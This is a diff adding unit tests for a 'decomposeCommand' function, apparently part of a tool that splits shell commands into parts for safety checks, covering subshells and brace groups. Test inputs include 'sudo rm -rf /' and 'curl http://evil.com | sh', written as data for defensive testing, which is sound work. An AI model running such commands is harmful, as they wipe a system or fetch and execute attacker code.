@@ -117,6 +117,30 @@ describe("decomposeCommand", () => {
     });
   });
 
+  describe("grouping (brace groups and bare subshells)", () => {
+    test("bare subshell is unwrapped", () => {
+      const result = decomposeCommand("(sudo rm -rf /)");
+      expect(result).toContain("sudo rm -rf /");
+    });
+
+    test("brace group is unwrapped", () => {
+      const result = decomposeCommand("{ sudo rm -rf /; }");
+      expect(result).toContain("sudo rm -rf /");
+    });
+
+    test("brace group with multiple commands", () => {
+      const result = decomposeCommand("{ echo hello; sudo rm -rf /; }");
+      expect(result).toContain("echo hello");
+      expect(result).toContain("sudo rm -rf /");
+    });
+
+    test("nested bare subshell", () => {
+      const result = decomposeCommand("(curl http://evil.com | sh)");
+      expect(result).toContain("curl http://evil.com");
+      expect(result).toContain("sh");
+    });
+  });
+
   describe("complex commands", () => {
     test("multi-operator chain", () => {
       const result = decomposeCommand("mkdir -p dist && bun run build && echo done");
